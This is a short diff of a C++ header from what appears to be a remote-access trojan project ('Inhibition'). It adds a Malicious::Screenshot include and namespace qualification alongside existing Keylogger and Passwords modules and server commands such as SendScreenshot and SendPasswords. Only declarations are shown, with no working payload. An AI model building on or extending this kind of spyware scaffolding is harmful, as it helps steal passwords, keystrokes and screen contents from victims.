@@ -5,6 +5,7 @@
 #include <common/Logger.hpp>
 #include <malicious/Passwords.hpp>
 #include <malicious/Keylogger.hpp>
+#include <malicious/Screenshot.hpp>
 #include "ServerAbstractFunction.hpp"
 
 namespace Inhibition
@@ -91,11 +92,11 @@ namespace Inhibition
     class SendScreenshot : public ServerAbstractFunction
     {
         public:
-            SendScreenshot(Screenshot& screenshooter_ref)
+            SendScreenshot(Malicious::Screenshot& screenshooter_ref)
             :screenshooter(screenshooter_ref){}
             virtual void operator()();
         private:
-            Screenshot& screenshooter;
+            Malicious::Screenshot& screenshooter;
     };
 
     class SendPasswords : public ServerAbstractFunction
